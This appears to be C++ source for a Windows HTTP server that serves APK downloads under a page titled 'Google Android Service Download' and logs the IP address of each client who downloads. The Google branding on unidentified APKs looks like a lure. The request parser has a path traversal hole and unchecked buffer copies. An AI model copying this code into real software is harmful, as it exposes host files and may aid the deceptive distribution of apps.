
#include <Windows.h>
#include "iosServer.h"
#include "PublicFunction.h"
#include "DownloadApk.h"

#include "Coder.h"





DWORD __stdcall DownloadApk::DownloadApkListener(){
	char szShowInfo[1024];
	SOCKET s = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	if (s == INVALID_SOCKET){
		WriteLogFile("DownloadApkBackListener socket error\r\n");
		return FALSE;
	}

	SOCKADDR_IN si = {0};
	//si.sin_addr.S_un.S_addr = inet_addr(SERVER_IP_ADDRESS);
	si.sin_addr.S_un.S_addr = INADDR_ANY;
	si.sin_family = AF_INET;
	si.sin_port = ntohs(SERVER_DOWNLOADAPK_BACKPORT);

	int ret = bind(s,(sockaddr*)&si,sizeof(SOCKADDR_IN));
	if (ret == INVALID_SOCKET){
		WriteLogFile("DownloadApkBackListener bind error\r\n");
		closesocket(s);
		return ret;
	}

	ret = listen(s,MAX_LISTEN_COUNT);
	if (ret == INVALID_SOCKET){
		WriteLogFile("DownloadApkBackListener listen error\r\n");
		closesocket(s);
		return ret;
	}

	SOCKADDR_IN siclient = {0};
	while(TRUE){
		int addrlen = sizeof(SOCKADDR_IN);

		SOCKET sockclient = accept(s,(sockaddr*)&siclient,&addrlen);
		if (sockclient != INVALID_SOCKET)
		{
			DWORD dwSockTimeOut = DATASOCK_TIME_OUT_VALUE;
			if (setsockopt(sockclient,SOL_SOCKET,SO_RCVTIMEO,(char*)&dwSockTimeOut,sizeof(DWORD))==SOCKET_ERROR)
			{
				wsprintfA(szShowInfo,"DownloadApkBackListener recv time setsockopt error code:%u\r\n",GetLastError());
				WriteLogFile(szShowInfo);
				continue;
			}

			dwSockTimeOut = DATASOCK_TIME_OUT_VALUE;
			if (setsockopt(sockclient,SOL_SOCKET,SO_SNDTIMEO,(char*)&dwSockTimeOut,sizeof(DWORD))==SOCKET_ERROR)
			{
				wsprintfA(szShowInfo,"DownloadApkBackListener send time setsockopt error code:%u\r\n",GetLastError());
				continue;
			}

			DATAPROCESS_PARAM stparam = {0};
			stparam.si = siclient;
			stparam.sockclient = sockclient;
			ret = GetCurrentDirectoryA(MAX_PATH,stparam.currentpath);
			if(ret){
				HANDLE h = CreateThread(0,0,(LPTHREAD_START_ROUTINE)ApkDownload,&stparam,0,0);
				CloseHandle(h);
			}
			continue;
		}
		else{
			WriteLogFile("DownloadApkBackListener accept error\r\n");
			continue;
		}
	}
	return TRUE;
}





DWORD ParseClientRequest(char * lphdr,LPDATAPROCESS_PARAM lpparam){

	DATAPROCESS_PARAM stparam = *lpparam;

	char * lpurl = lphdr;
	if (memcmp(lphdr,"GET ",4) == 0){
		lpurl = lphdr + 4;
	}
	else if(memcmp(lphdr,"POST ",5) ==0 )
	{
		lpurl = lphdr + 5;
	}else{
		closesocket(stparam.sockclient);
		return FALSE;
	}
	
	char * lpend = strstr(lpurl," HTTP/1.1");
	if(lpend == FALSE){
		closesocket(stparam.sockclient);
		return FALSE;
	}

	char szurl[MAX_PATH] = {0};
	memmove(szurl,lpurl,lpend - lpurl);

	char szpath[MAX_PATH];
	lstrcpyA(szpath,stparam.currentpath);
	lstrcatA(szpath,szurl);

	HANDLE hFile = CreateFileA(szpath,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
	if(hFile == INVALID_HANDLE_VALUE){
		closesocket(stparam.sockclient);
		return FALSE;
	}

	DWORD dwFileSize = GetFileSize(hFile,0);

	char sztexthtml[] = "text/html";
	char sztextcss[] = "text/css";
	char szimagejpeg[] = "image/jpeg";
	char szimagepng[] = "image/png";
	char sztextjson[] = "text/json";
	char sztextjs[] = "application/javascript";

	char szhttpechohdr[] = 
		"HTTP/1.1 200 OK\r\n"
		//"User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)\r\n"
		"Content-type: %s;q=0.5\r\n"
		"Content-Language: zh-CN;en-US\r\n"
		"Connection: keep-alive\r\n"
		//"Content-Encoding: gzip/deflate\r\n"
		"Content-Length: %u\r\n\r\n";

	char * szsendbuf = new char[dwFileSize + 0x1000];
	int size = 0;
	if(lstrcmpA(szpath + lstrlenA(szpath) - 4,".jpg")== 0 || lstrcmpA(szpath + lstrlenA(szpath) - 5,".jpeg")== 0 ){
		size = wsprintfA(szsendbuf,szhttpechohdr,szimagejpeg,dwFileSize);
	}
	else if (lstrcmpA(szpath + lstrlenA(szpath) - 4,".png")== 0 )
	{
		size = wsprintfA(szsendbuf,szhttpechohdr,szimagepng,dwFileSize);
	}
	else if (lstrcmpA(szpath + lstrlenA(szpath) - 4,".css") == 0)
	{
		size = wsprintfA(szsendbuf,szhttpechohdr,sztextcss,dwFileSize);
	}
	else if (lstrcmpA(szpath + lstrlenA(szpath) - 3,".js") == 0)
	{
		size = wsprintfA(szsendbuf,szhttpechohdr,sztextjs,dwFileSize);
	}
	else{
		size = wsprintfA(szsendbuf,szhttpechohdr,sztexthtml,dwFileSize);
	}

	DWORD dwCnt = 0;
	int iRet = ReadFile(hFile,szsendbuf + size, dwFileSize,&dwCnt,0);
	CloseHandle(hFile);
	if (iRet == FALSE || dwCnt != dwFileSize){
		closesocket(stparam.sockclient);
		delete [] szsendbuf;
		return FALSE;
	}

	size += dwFileSize;
	iRet = send(stparam.sockclient,szsendbuf,size,0);
	closesocket(stparam.sockclient);
	delete [] szsendbuf;
	if (iRet <= 0)
	{
		return FALSE;
	}
	return TRUE;
}







#define DownloadApkException 3





DWORD __stdcall DownloadApk::ApkDownload(LPDATAPROCESS_PARAM lpparam){
	DATAPROCESS_PARAM stparam = * lpparam;
	char szLog[1024];

	try{
		//throw DownloadApkException;

		char lpdata[NETWORK_DATABUF_SIZE] = {0};
		int dwPackSize = recv(stparam.sockclient,lpdata,NETWORK_DATABUF_SIZE,0);
		if (dwPackSize <= 0){
			
			ErrorFormat(&stparam,szLog,"DownloadApk recv first packet error");
			WriteLogFile(szLog);
			closesocket(stparam.sockclient);
			return FALSE;
		}

		int size = 0;
		char szgetformat[] = "GET /%s";
		char szapkico[] = "GET /favicon.ico";
		//char szgetimageFormat[] = "GET /image/%s";
		//char szmusicurl[MAX_PATH];
		//char szpictureurl[MAX_PATH];
		//char szgetimage[MAX_PATH];
		char szgetapk[MAX_PATH];
		char szgetbasic[MAX_PATH];

		//wsprintfA(szgetimage,szgetimageFormat,BACKGROUD_PICTURE_FILENAME);
		//wsprintfA(szmusicurl,szgetformat,BACKGROUD_MUSIC_FILENAME);
		//wsprintfA(szpictureurl,szgetformat,BACKGROUD_PICTURE_FILENAME);
		wsprintfA(szgetapk,szgetformat,APK_FILENAME);
		wsprintfA(szgetbasic,szgetformat,APK_BASIC_FILENAME);

		char szhttpechohdrText[] = 
			"HTTP/1.1 200 OK\r\n"
			//"User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)\r\n"
			"Content-type: text/html;charset=utf-8;q=0.8;*.*\r\n"
			"Content-Language: zh-CN;en-US\r\n"
			"Connection: keep-alive\r\n"
			"Content-Encoding: gzip/deflate\r\n"
			"Content-Length: %u\r\n\r\n";

		char szhttpechohdrApp[] = 
			"HTTP/1.1 200 OK\r\n"
			"Content-type: application/octet-stream;charset=utf-8;q=0.8\r\n"
			"Content-Language: zh-CN;en-US\r\n"
			"Connection: keep-alive\r\n"
			//"Content-Encoding: gzip/deflate\r\n"
			"Content-Length: %u\r\n\r\n";
		
		char szhttpechohdrPhoto[] = 
			"HTTP/1.1 200 OK\r\n"
			"Content-Type: image/jpeg\r\n"
			"Content-Language: zh-CN;en-US\r\n"
			"Connection: keep-alive\r\n"
			//"Content-Encoding: gzip/deflate\r\n"
			"Content-Length: %u\r\n\r\n";

		char szhttpechohdrMedia[] = 
			"HTTP/1.1 200 OK\r\n"
			"Content-Type: audio/mp3\r\n"
			"Content-Language: zh-CN;en-US\r\n"		//zh-CN,en-US;q=0.8
			"Connection: keep-alive\r\n"
			//"Content-Encoding: gzip/deflate\r\n"
			"Content-Length: %u\r\n\r\n";
	
		if (memcmp(lpdata,"GET / ",6) == 0)
		{
			char szhtmlFormat[] = 
				"<html>\r\n"
				"<head>\r\n"
				"<title>%s</title>\r\n"
				"</head>\r\n"
				"<body style=\"background-color: #f0f0f0\">\r\n"				// background=\"image/%s\"
				"<p><font size=\"%s\" color=\"%s\">%s</font></p>\r\n"
				"<p></p>\r\n"
				"<p></p>\r\n"
				"<p></p>\r\n"
				"<p><b><i><a href=\"%s\" download=\"%s\"><font size=\"%s\" color=\"%s\">%s</font></a></i></b></p>\r\n"
				"<p></p>\r\n"
				"<p></p>\r\n"
				"<p></p>\r\n"
				"<p><b><i><a href=\"%s\" download=\"%s\"><font size=\"%s\" color=\"%s\">%s</font></a></i></b></p>\r\n"
				"<p></p>\r\n"
				"<p></p>\r\n"
				"<p></p>\r\n"
				"<p><b><i><a href=\"myscheme://myhost/open?url=https://www.baidu.com\"><font size=\"%s\" color=\"%s\">%s</font></a></i></b></p>\r\n"
// 				"<p><b><i><a href=\"https://baidu.com\"><font size=\"%s\" color=\"%s\">%s</font></a></i></b></p>\r\n"
// 				"<p><img src=\"%s\" width=\"100%\" height=\"100%\" alt=\"\"/></p>\r\n"
// 				"<audio controls=\"controls\" hidden=\"hidden\" autoplay=\"autoplay\" loop=\"loop\">\r\n"
// 				"<source src=\"%s\" type=\"audio/mpeg\"/>\r\n"
// 				"</audio>\r\n"
// 				"<audio autoplay=\"autoplay\">\r\n"
// 				"<source src=\"%s\" type=\"audio/mpeg\">\r\n"
// 				"</audio>\r\n"
				"</body>\r\n"
				"</html>\r\n";

			char szBodyFontSize[] = "10";
			char szDownloadFontSize[] = "10";
			char szRunFontSize[] = "10";
			char szBodyTextColor[] = "black";
			char szDownloadColor[] = "green";
			char szDownloadBasicColor[] = "black";
			char szDownloadBasicFontSize[] = "10";
			char szRunColor[] = "red";

			char szTitleText[] = "Google Android Service Download";
			char szBodyText[] = "Google Android Service";
			char szDownloadTextGBK[] = "google插件版下载";
			char szDownloadBasicTextGBK[] = "基本版程序下载";

			char szRunTextGBK[] = "Run";
			char * szRunTextUTF8 = 0;
			int utf8len = Coder::GBKToUTF8(szRunTextGBK,&szRunTextUTF8);
			char * szDownloadTextUTF8 = 0;
			utf8len = Coder::GBKToUTF8(szDownloadTextGBK,&szDownloadTextUTF8);
			char * szDownloadBasicTextUTF8 = 0;
			utf8len = Coder::GBKToUTF8(szDownloadBasicTextGBK,&szDownloadBasicTextUTF8);
		
			char szhtml[0x1000];
			int htmllen = wsprintfA(szhtml,szhtmlFormat,
				szTitleText,
				/*BACKGROUD_PICTURE_FILENAME,*/
				szBodyFontSize,szBodyTextColor,szBodyText,
				APK_FILENAME,APK_FILENAME,szDownloadFontSize,szDownloadColor,szDownloadTextUTF8,			
				
				APK_BASIC_FILENAME,APK_BASIC_FILENAME,szDownloadBasicFontSize,szDownloadBasicColor,szDownloadBasicTextUTF8,
				szRunFontSize,szRunColor,szRunTextUTF8
				//,BACKGROUD_MUSIC_FILENAME
				);
			if (szDownloadBasicTextUTF8)
			{
				delete []szDownloadBasicTextUTF8;
			}
			if (szDownloadTextUTF8)
			{
				delete []szDownloadTextUTF8;
			}
			
			if (szRunTextUTF8)
			{
				delete []szRunTextUTF8;
			}
			
			char szsendbuf[NETWORK_DATABUF_SIZE];
			int sendlen = wsprintfA(szsendbuf,szhttpechohdrText,htmllen);
			memmove(szsendbuf + sendlen, szhtml,htmllen);
			sendlen += htmllen;

			size = send(stparam.sockclient,szsendbuf,sendlen,0);
			closesocket(stparam.sockclient);
			if (size <= 0)
			{
				ErrorFormat(&stparam,szLog,"DownloadApk send html packet error");
				WriteLogFile(szLog);
				return FALSE;
			}
			else{
				return TRUE;
			}
		}
		/*
		else if(memcmp(lpdata,"GET /login",lstrlenA("GET /login")) == 0){
			HANDLE hFile = CreateFileA(LOGIN_FILENAME,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
			if(hFile == INVALID_HANDLE_VALUE){
				closesocket(stparam.sockclient);
				return FALSE;
			}

			DWORD dwFileSize = GetFileSize(hFile,0);
			char * szsendbuf = new char[dwFileSize + 0x4000];
			memset(szsendbuf,0,dwFileSize);
			int sendlen = wsprintfA(szsendbuf,szhttpechohdrText,dwFileSize);

			DWORD dwCnt = 0;
			int iRet = ReadFile(hFile,szsendbuf + sendlen, dwFileSize,&dwCnt,0);
			CloseHandle(hFile);
			if (iRet == FALSE || dwCnt != dwFileSize){
				delete [] szsendbuf;
				closesocket(stparam.sockclient);
				return FALSE;
			}

			sendlen += dwFileSize;
			size = send(stparam.sockclient,szsendbuf,sendlen,0);
			if (size <= 0)
			{
				closesocket(stparam.sockclient);
				delete [] szsendbuf;
				return FALSE;
			}
			closesocket(stparam.sockclient);
			delete [] szsendbuf;
			return TRUE;
		}
		else if(memcmp(lpdata,"GET /system",lstrlenA("GET /system")) == 0){
			HANDLE hFile = CreateFileA(SYSTEM_FILENAME,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
			if(hFile == INVALID_HANDLE_VALUE){
				closesocket(stparam.sockclient);
				return FALSE;
			}

			DWORD dwFileSize = GetFileSize(hFile,0);
			char * szsendbuf = new char[dwFileSize + 0x4000];
			memset(szsendbuf,0,dwFileSize);
			int sendlen = wsprintfA(szsendbuf,szhttpechohdrText,dwFileSize);

			DWORD dwCnt = 0;
			int iRet = ReadFile(hFile,szsendbuf + sendlen, dwFileSize,&dwCnt,0);
			CloseHandle(hFile);
			if (iRet == FALSE || dwCnt != dwFileSize){
				delete [] szsendbuf;
				closesocket(stparam.sockclient);
				return FALSE;
			}

			sendlen += dwFileSize;
			size = send(stparam.sockclient,szsendbuf,sendlen,0);
			if (size <= 0)
			{
				closesocket(stparam.sockclient);
				delete [] szsendbuf;
				return FALSE;
			}
			closesocket(stparam.sockclient);
			delete [] szsendbuf;
			return TRUE;
		}
		*/
		/*
		else if(memcmp(lpdata,szmusicurl,lstrlenA(szmusicurl)) == 0)
		{
			HANDLE hFile = CreateFileA(BACKGROUD_MUSIC_FILENAME,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
			if(hFile == INVALID_HANDLE_VALUE){
				closesocket(stparam.sockclient);
				return FALSE;
			}

			DWORD dwFileSize = GetFileSize(hFile,0);
			char * szsendbuf = new char[dwFileSize + 0x1000];
			int sendlen = wsprintfA(szsendbuf,szhttpechohdrMedia,dwFileSize);

			DWORD dwCnt = 0;
			int iRet = ReadFile(hFile,szsendbuf + sendlen, dwFileSize,&dwCnt,0);
			CloseHandle(hFile);
			if (iRet == FALSE || dwCnt != dwFileSize){
				delete [] szsendbuf;
				closesocket(stparam.sockclient);
				return FALSE;
			}

			sendlen += dwFileSize;
			size = send(stparam.sockclient,szsendbuf,sendlen,0);
			if (size <= 0)
			{
				closesocket(stparam.sockclient);
				delete [] szsendbuf;
				return FALSE;
			}
			closesocket(stparam.sockclient);
			delete [] szsendbuf;
			return TRUE;
		}
		else if (memcmp(lpdata,szpictureurl,lstrlenA(szpictureurl)) == 0 || memcmp(lpdata,szgetimage,lstrlenA(szgetimage)) == 0)
		{
			HANDLE hFile = CreateFileA(BACKGROUD_PICTURE_FILENAME,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
			if(hFile == INVALID_HANDLE_VALUE){
				closesocket(stparam.sockclient);
				return FALSE;
			}

			DWORD dwFileSize = GetFileSize(hFile,0);
			char * szsendbuf = new char[dwFileSize + 0x1000];
			int sendlen = wsprintfA(szsendbuf,szhttpechohdrPhoto,dwFileSize);

			DWORD dwCnt = 0;
			int iRet = ReadFile(hFile,szsendbuf + sendlen, dwFileSize,&dwCnt,0);
			CloseHandle(hFile);
			if (iRet == FALSE || dwCnt != dwFileSize){
				closesocket(stparam.sockclient);
				delete [] szsendbuf;
				return FALSE;
			}

			sendlen += dwFileSize;
			size = send(stparam.sockclient,szsendbuf,sendlen,0);
			if (size <= 0)
			{
				closesocket(stparam.sockclient);
				delete [] szsendbuf;
				return FALSE;
			}
			closesocket(stparam.sockclient);
			delete [] szsendbuf;
			return TRUE;
		}
		*/
		else if (memcmp(lpdata,szapkico,lstrlenA(szapkico)) == 0)
		{
			HANDLE hFile = CreateFileA(APK_ICO_FILENAME,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
			if(hFile == INVALID_HANDLE_VALUE){
				WriteLogFile("DownloadApk not found ico file in local folder\r\n");
				closesocket(stparam.sockclient);
				return FALSE;
			}

			DWORD dwFileSize = GetFileSize(hFile,0);
			char * szsendbuf = new char[dwFileSize + 0x1000];
			int sendlen = wsprintfA(szsendbuf,szhttpechohdrPhoto,dwFileSize);

			DWORD dwCnt = 0;
			int iRet = ReadFile(hFile,szsendbuf + sendlen, dwFileSize,&dwCnt,0);
			CloseHandle(hFile);
			if (iRet == FALSE || dwCnt != dwFileSize){
				closesocket(stparam.sockclient);
				delete [] szsendbuf;
				return FALSE;
			}

			sendlen += dwFileSize;
			size = send(stparam.sockclient,szsendbuf,sendlen,0);
			closesocket(stparam.sockclient);
			delete [] szsendbuf;
			if (size <= 0)
			{
				return FALSE;
			}

			return TRUE;
		}
		else if (memcmp(lpdata,szgetapk,lstrlenA(szgetapk)) == 0)
		{
			HANDLE hFile = CreateFileA(APK_FILENAME,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
			if(hFile == INVALID_HANDLE_VALUE){

				WriteLogFile("DownloadApk not found apk file in local folder\r\n");
				closesocket(stparam.sockclient);
				return FALSE;
			}

			DWORD dwFileSize = GetFileSize(hFile,0);
			char * szsendbuf = new char[dwFileSize + 0x1000];
			int sendlen = wsprintfA(szsendbuf,szhttpechohdrApp,dwFileSize);

			DWORD dwCnt = 0;
			int iRet = ReadFile(hFile,szsendbuf + sendlen, dwFileSize,&dwCnt,0);
			CloseHandle(hFile);
			if (iRet == FALSE || dwCnt != dwFileSize){
				closesocket(stparam.sockclient);
				delete [] szsendbuf;
				return FALSE;
			}

			sendlen += dwFileSize;
			size = send(stparam.sockclient,szsendbuf,sendlen,0);

			closesocket(stparam.sockclient);
			delete[] szsendbuf;
			if (size <= 0)
			{
				return FALSE;
			}


			SYSTEMTIME sttime = { 0 };
			GetLocalTime(&sttime);
			unsigned char ucip[4];
			memmove(ucip, &stparam.si.sin_addr.S_un.S_addr, 4);
			wsprintfA(szLog, "load apk,client ip:%u_%u_%u_%u,port:%u,time:%u/%u/%u %u:%u:%u\r\n", ucip[0], ucip[1], ucip[2], ucip[3],stparam.si.sin_port,
				sttime.wYear, sttime.wMonth,sttime.wDay, sttime.wHour, sttime.wMinute, sttime.wSecond);
			WriteLogFile(szLog);
			return TRUE;
		}
		else if (memcmp(lpdata,szgetbasic,lstrlenA(szgetbasic)) == 0)
		{
			HANDLE hFile = CreateFileA(APK_BASIC_FILENAME,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
			if(hFile == INVALID_HANDLE_VALUE){
				WriteLogFile("DownloadApk not found base apk file in local folder\r\n");
				closesocket(stparam.sockclient);
				return FALSE;
			}

			DWORD dwFileSize = GetFileSize(hFile,0);
			char * szsendbuf = new char[dwFileSize + 0x1000];
			int sendlen = wsprintfA(szsendbuf,szhttpechohdrApp,dwFileSize);

			DWORD dwCnt = 0;
			int iRet = ReadFile(hFile,szsendbuf + sendlen, dwFileSize,&dwCnt,0);
			CloseHandle(hFile);
			if (iRet == FALSE || dwCnt != dwFileSize){
				closesocket(stparam.sockclient);
				delete [] szsendbuf;
				return FALSE;
			}

			sendlen += dwFileSize;
			size = send(stparam.sockclient,szsendbuf,sendlen,0);
			closesocket(stparam.sockclient);
			delete [] szsendbuf;
			if (size <= 0)
			{
				return FALSE;
			}

			SYSTEMTIME sttime = { 0 };
			GetLocalTime(&sttime);
			unsigned char ucip[4];
			memmove(ucip, &stparam.si.sin_addr.S_un.S_addr, 4);
			wsprintfA(szLog, "load basic apk,client ip:%u_%u_%u_%u,port:%u,time:%u/%u/%u %u:%u:%u\r\n", ucip[0], ucip[1], ucip[2], ucip[3],stparam.si.sin_port,
				sttime.wYear, sttime.wMonth,sttime.wDay, sttime.wHour, sttime.wMinute, sttime.wSecond);
			WriteLogFile(szLog);
			return TRUE;
		}
		else if (memcmp(lpdata,"HEAD ",5) == 0)
		{
			char szheadurl[MAX_PATH];
			wsprintfA(szheadurl,"HEAD /%s",APK_FILENAME);
			char szheadbasicurl[MAX_PATH];
			wsprintfA(szheadbasicurl,"HEAD /%s",APK_BASIC_FILENAME);
			HANDLE hFile = INVALID_HANDLE_VALUE;
			if (memcmp(lpdata,szheadurl,lstrlenA(szheadurl)) == 0)
			{
				hFile = CreateFileA(APK_FILENAME,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
			}
			else if (memcmp(lpdata,szheadbasicurl,lstrlenA(szheadbasicurl)) == 0)
			{
				hFile = CreateFileA(APK_BASIC_FILENAME,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
			}
			else{
				WriteLogFile("DownloadApk HEAD not found apk file in local folder\r\n");
				closesocket(stparam.sockclient);
				return TRUE;
			}

			if(hFile == INVALID_HANDLE_VALUE){
				closesocket(stparam.sockclient);
				return FALSE;
			}
			DWORD dwFileSize = GetFileSize(hFile,0);
			CloseHandle(hFile);

			char szsendbuf[0x1000];
			int sendlen = wsprintfA(szsendbuf,szhttpechohdrText,dwFileSize);

			size = send(stparam.sockclient,szsendbuf,sendlen,0);
			closesocket(stparam.sockclient);
			if (size <= 0)
			{
				return FALSE;
			}

			return TRUE;
		}
		else if (memcmp(lpdata,"GET ",4) == 0)
		{
			ParseClientRequest(lpdata,&stparam);
		}
		else if (memcmp(lpdata,"POST ",5) == 0)
		{
			ParseClientRequest(lpdata,&stparam);
			int tmp = 0;
			tmp ++;
		}
		else{
			WriteLogFile("DownloadApk recv unrecognized packet error\r\n");
			closesocket(stparam.sockclient);
			return FALSE;
		}

		return TRUE;
	}
	catch(...){
		char szLog[1024];
		ErrorFormat(&stparam,szLog,"DownloadApk exception");
		WriteLogFile(szLog);
		return FALSE;
	}
}
